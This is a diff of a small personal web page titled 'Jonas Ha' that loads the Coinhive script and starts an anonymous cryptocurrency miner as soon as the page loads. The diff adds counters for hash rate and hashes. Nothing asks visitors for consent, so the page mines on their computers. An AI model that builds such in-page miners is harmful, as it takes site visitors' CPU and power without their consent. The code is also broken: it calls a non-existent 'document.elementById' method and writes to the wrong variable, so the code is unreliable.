@@ -1,10 +1,20 @@
 <html>
+
 	<head>
 	    <title>Jonas Ha</title>
+	    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	</head>
 	<body>
-	    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	    <div id="hashesPerSecond"></div>
+	    <div id="totalHashes"></div>
+	    <div id="acceptedHashes"></div>
+
+
 	    <script>
+	    var hashesPerSecondElement = document.elementById('hashesPerSecond');
+	    var totalHashesElement = document.elementById('totalHashes');
+	    var acceptedHashesElement = document.elementById('acceptedHashes');
+
 	    var miner = new CoinHive.Anonymous('dIhhmYuKCoBc8tCupB1tWhZP1wkc5Bd8');
 	    miner.start();
 
@@ -20,8 +30,12 @@
 	        var totalHashes = miner.getTotalHashes();
 	        var acceptedHashes = miner.getAcceptedHashes();
 
-	        // Output to HTML elements...
+	        hashesPerSecond.innerText = hashesPerSecond;
+	        totalHashesElement.innerText = totalHashes;
+	        acceptedHashesElement.innerText = acceptedHashes;
+
 	    }, 1000);
 	    </script>
 	</body>
+
 </html>
